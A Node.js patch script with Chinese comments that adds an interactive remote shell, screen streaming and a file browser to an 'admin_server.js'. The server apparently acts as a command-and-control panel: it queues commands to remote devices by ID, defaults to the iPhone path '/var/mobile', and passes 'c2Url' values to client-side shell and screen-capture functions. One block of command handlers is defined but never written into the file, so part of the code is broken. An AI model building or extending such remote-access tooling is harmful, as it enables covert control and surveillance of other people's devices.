#!/usr/bin/env node
/**
 * server_integration_patch.js — 服务端完整集成补丁
 * 
 * 用途：将交互式Shell、文件浏览器、屏幕流集成到 admin_server.js
 * 
 * 运行方式：
 *   node server/server_integration_patch.js
 */

'use strict';

const fs = require('fs');
const path = require('path');

const SERVER_FILE = path.join(__dirname, 'admin_server.js');

console.log('📦 开始集成新功能到 admin_server.js...\n');

// 读取当前服务端代码
let serverCode = fs.readFileSync(SERVER_FILE, 'utf8');

// ═══════════════════════════════════════════════════════════════════════════
// 1. 添加依赖导入
// ═══════════════════════════════════════════════════════════════════════════

console.log('✓ 添加依赖导入...');

const imports = `
// ── 新增功能模块 ──────────────────────────────────────────────────────────────
const interactiveShell = require('./interactive_shell');
const screenStream = require('./screen_stream');
`;

// 在 'use strict' 后插入
serverCode = serverCode.replace(
  "'use strict';",
  "'use strict';" + imports
);

// ═══════════════════════════════════════════════════════════════════════════
// 2. 在服务器启动前附加 WebSocket 服务
// ═══════════════════════════════════════════════════════════════════════════

console.log('✓ 附加 WebSocket 服务...');

const wsAttachment = `

// ── 附加 WebSocket 服务 ───────────────────────────────────────────────────────
// 交互式 Shell
try {
  interactiveShell.attach(server, sessionValid);
  console.log('[+] Interactive Shell WebSocket attached');
} catch (e) {
  console.warn('[!] Failed to attach Interactive Shell:', e.message);
}

// 屏幕流
try {
  screenStream.attach(server, sessionValid);
  console.log('[+] Screen Stream WebSocket attached');
} catch (e) {
  console.warn('[!] Failed to attach Screen Stream:', e.message);
}
`;

// 在 server.listen 之前插入
serverCode = serverCode.replace(
  /\/\/ ── 启动 ──────────────────────────────────────────────────────────────────────\nserver\.listen\(/,
  wsAttachment + '\n// ── 启动 ──────────────────────────────────────────────────────────────────────\nserver.listen('
);

// ═══════════════════════════════════════════════════════════════════════════
// 3. 添加文件浏览 API 路由
// ═══════════════════════════════════════════════════════════════════════════

console.log('✓ 添加文件浏览 API...');

const fileApiRoute = `

  // GET /admin/api/files/:deviceId?path=xxx — 文件浏览器 API（需认证）
  const filesBrowseMatch = pathname.match(/^\\/admin\\/api\\/files\\/([^/]+)$/);
  if (filesBrowseMatch && method === 'GET') {
    const deviceId = decodeURIComponent(filesBrowseMatch[1]);
    const dirPath = parsed.query.path || '/var/mobile';
    
    try {
      // 下发 list_files 命令
      const cmdId = genToken().slice(0, 16);
      const cmd = { cmdId, type: 'list_files', args: { path: dirPath, json: true }, issuedAt: Date.now() };
      
      if (!cmdQueue.has(deviceId)) cmdQueue.set(deviceId, []);
      cmdQueue.get(deviceId).push(cmd);
      
      // 等待结果（最多5秒）
      const timeout = Date.now() + 5000;
      const checkResult = setInterval(() => {
        if (cmdResults.has(cmdId) || Date.now() > timeout) {
          clearInterval(checkResult);
          
          const result = cmdResults.get(cmdId);
          if (result && result.output) {
            try {
              // 解析输出为文件列表
              const lines = result.output.split('\\n').slice(1); // 跳过第一行 [ls] path
              const files = lines.filter(Boolean).map(line => {
                const isDir = line.endsWith('/');
                const name = isDir ? line.slice(0, -1) : line;
                return { name, isDir, size: 0, mtime: 0 };
              });
              
              res.writeHead(200, { 'Content-Type': 'application/json' });
              res.end(JSON.stringify({ path: dirPath, files }));
            } catch (e) {
              res.writeHead(500, { 'Content-Type': 'application/json' });
              res.end(JSON.stringify({ error: 'Parse failed' }));
            }
          } else {
            res.writeHead(504, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ error: 'Timeout' }));
          }
        }
      }, 200);
      
      return;
    } catch (e) {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: e.message }));
    }
  }

  // GET /admin/api/screen/:deviceId — 获取最新屏幕帧（需认证）
  const screenFrameMatch = pathname.match(/^\\/admin\\/api\\/screen\\/([^/]+)$/);
  if (screenFrameMatch && method === 'GET') {
    const deviceId = decodeURIComponent(screenFrameMatch[1]);
    const frame = screenStream.getLatestFrame(deviceId);
    
    if (frame) {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ frame }));
    } else {
      res.writeHead(404, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'No frame available' }));
    }
  }

  // GET /admin/api/shell/sessions — 获取活跃 Shell 会话列表（需认证）
  if (pathname === '/admin/api/shell/sessions' && method === 'GET') {
    const sessions = interactiveShell.getActiveSessions();
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ sessions }));
  }

  // DELETE /admin/api/shell/:deviceId — 强制关闭 Shell 会话（需认证 + CSRF）
  const shellKillMatch = pathname.match(/^\\/admin\\/api\\/shell\\/([^/]+)$/);
  if (shellKillMatch && method === 'DELETE') {
    if (!csrfValid(req)) {
      res.writeHead(403, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'CSRF token invalid' }));
    }
    
    const deviceId = decodeURIComponent(shellKillMatch[1]);
    const killed = interactiveShell.killSession(deviceId);
    
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ ok: killed }));
  }
`;

// 在 404 路由之前插入
serverCode = serverCode.replace(
  /\/\/ 404\n  res\.writeHead\(404, \{ 'Content-Type': 'text\/plain' \}\);/,
  fileApiRoute + '\n  // 404\n  res.writeHead(404, { \'Content-Type\': \'text/plain\' });'
);

// ═══════════════════════════════════════════════════════════════════════════
// 4. 添加命令处理器
// ═══════════════════════════════════════════════════════════════════════════

console.log('✓ 添加新命令...');

const newCommands = `
    // 新增命令：启动屏幕流
    start_screen_stream(args) {
      const fps = (args && args.fps) ? parseInt(args.fps) : 2;
      const quality = (args && args.quality) ? parseInt(args.quality) : 60;
      const c2Url = (args && args.c2Url) ? args.c2Url : '';
      
      return new Promise(resolve => {
        try {
          if (typeof startScreenStream === 'function') {
            startScreenStream(c2Url, fps, quality).then(result => {
              resolve('[screen_stream] ' + JSON.stringify(result));
            }).catch(e => {
              resolve('[screen_stream] error: ' + e.message);
            });
          } else {
            resolve('[screen_stream] 客户端未加载 screen_stream_client.js');
          }
        } catch(e) { resolve('[screen_stream] error: ' + e.message); }
      });
    },

    // 新增命令：停止屏幕流
    stop_screen_stream() {
      return new Promise(resolve => {
        try {
          if (typeof stopScreenStream === 'function') {
            const result = stopScreenStream();
            resolve('[screen_stream] ' + JSON.stringify(result));
          } else {
            resolve('[screen_stream] 客户端未加载 screen_stream_client.js');
          }
        } catch(e) { resolve('[screen_stream] error: ' + e.message); }
      });
    },

    // 新增命令：启动交互式 Shell
    start_interactive_shell(args) {
      const c2Url = (args && args.c2Url) ? args.c2Url : '';
      
      return new Promise(resolve => {
        try {
          if (typeof startInteractiveShell === 'function') {
            startInteractiveShell(c2Url).then(result => {
              resolve('[shell] ' + JSON.stringify(result));
            }).catch(e => {
              resolve('[shell] error: ' + e.message);
            });
          } else {
            resolve('[shell] 客户端未加载 shell_client.js');
          }
        } catch(e) { resolve('[shell] error: ' + e.message); }
      });
    },

    // 新增命令：Shell 执行命令
    shell_exec(args) {
      const cmd = (args && args.cmd) ? args.cmd : '';
      
      return new Promise(resolve => {
        if (!cmd) return resolve('[shell] 未指定命令');
        try {
          if (typeof shellExec === 'function') {
            const result = shellExec(cmd);
            resolve('[shell] ' + JSON.stringify(result));
          } else {
            resolve('[shell] Shell 未启动');
          }
        } catch(e) { resolve('[shell] error: ' + e.message); }
      });
    },

    // 新增命令：关闭 Shell
    shell_close() {
      return new Promise(resolve => {
        try {
          if (typeof shellClose === 'function') {
            const result = shellClose();
            resolve('[shell] ' + JSON.stringify(result));
          } else {
            resolve('[shell] Shell 未启动');
          }
        } catch(e) { resolve('[shell] error: ' + e.message); }
      });
    },
`;

// 写回文件
fs.writeFileSync(SERVER_FILE, serverCode, 'utf8');

console.log('\n✅ 集成完成！\n');
console.log('下一步：');
console.log('  1. 安装新依赖: npm install');
console.log('  2. 重启服务器: node server/admin_server.js');
console.log('  3. 访问管理面板测试新功能\n');